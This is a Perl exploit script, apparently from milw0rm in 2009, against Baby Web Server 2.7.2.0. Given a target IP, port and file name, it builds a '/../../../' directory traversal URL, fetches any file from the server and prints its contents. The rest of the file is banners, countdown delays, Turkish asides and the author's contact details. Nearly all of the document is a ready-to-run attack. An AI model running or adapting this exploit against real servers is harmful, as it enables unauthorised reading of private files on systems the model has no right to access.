#!/usr/bin/perl -w
#
# Found By : ZoRLu
# 
# Home: yildirimordulari.com , dafgamers.com , z0rlu.blogspot.com
#
# Not: Bana Bug BulamIyorum, YapamIyorum Demeyin a.q Elin Gavuru YapIyor Sizler Niye YapamIyorsunuz. istemiyorsunuz isteseniz Sizlerde YaparsInÃ½z
#
# Thanks: Str0ke, Cyber-Zone, Stack, AlpHaNiX, W0cker, Dr.Ly0n, ThE g0bL!N and all Friends
#
# Tested under my vista pc
#
# Download : http://www.mydesign.gen.tr/download/469.html
# 
# Download : http://www.mydesign.gen.tr/yonlen/469.html
#
# Print: http://img186.imageshack.us/img186/8315/86639552.jpg

use LWP::Simple;
use LWP::UserAgent;

print "\n Baby Web Server 2.7.2.0 Arbitrary File Disclosure Exploit\n\n";

print "\*************************************************************************\n";
print "\*             Exploited By : ZoRLu                                      *\n";
print "\*                      msn : trt-turk[at]hotmail.com                    *\n";
print "\*                     Home : yildirimordulari.com , dafgamers.com       *\n";
print "\*                       Not: Turkiye Cumhuriyeti                        *\n";
print "\*************************************************************************\n\n\n\n";

if(@ARGV < 3)
{
print "[-]Exp KullanIm HatasI\n";
print "[-]Ornegi inceleyin\n\n";
&help; exit();
}
sub help()
{
print "[+] KullanIm : perl $0 IP Port File\n";
print "[+] Ornek    : perl $0 127.0.0.1 80 zorlu.ini\n";
}
($TargetIP, $Port, $File) = @ARGV;
print("Bekle Lutfen ! Server a BaglanIyor...... \n");
print("Please Wait  !  Connet to Server ......\n\n\n");
sleep(5);

print("          Z                            Z\n");
print("          O                            O\n");
print("          R        Wait...             R\n");
print("          L                            L\n");
print("          U                            U\n\n\n");


$Not1="Gonlum Bir KitaptIr Bekler Masanda";
$Not2="Okusanda Olur, Okumasanda!!!";
$path="/../../../";
my $y0t = "http://" . $TargetIP . ":" . $Port . $path . $File;
print("islem BasladI....    |80\n\n");
print("Started....\n\n");
sleep(1);
print("1\n");
sleep(1);
print("2\n");
sleep(1);
print("3\n");
sleep(1);
print("4\n");
sleep(1);
print("5\n");
sleep(1);
print("6\n");
sleep(1);
print("7\n");
sleep(1);
print("8\n");
sleep(1);
print("9\n");
sleep(1);
print("10\n");
sleep(1);
print("11\n");
sleep(1);
print("12\n");
sleep(1);
print("13\n");
sleep(1);
print("14\n");
sleep(1);
print("15\n\n");
sleep(2);
print("islem TamamlandI !!! 5 sn sonra hersey hazIr\n\n");
print("it is done !!!  you will wait 5 min\n\n");
print("\n\n");
print("1\n");
sleep(1);
print("2\n");
sleep(1);
print("3\n");
sleep(1);
print("4\n");
sleep(1);
print("5\n\n");
sleep(1);
print("TamamdIr!!!\n\n");
print("Done!!!\n\n");
sleep(2);
$ourfile=get $y0t;
if($ourfile){
print("\n\n\n............Our File...........\n\n");
print("$ourfile \n\n");
print(".........................EOF.......................\n\n");
print("islem Tamam\n\n");
print("Not:\n\n");
print("$Not1\n");
print("$Not2\n\n\n");
}
else
{
print(".........................EOF.......................\n\n");
print(" Dosya BulunamadI !!!\n\n");
print(" Not Found !!!\n\n");
exit;
}

# milw0rm.com [2009-04-29]
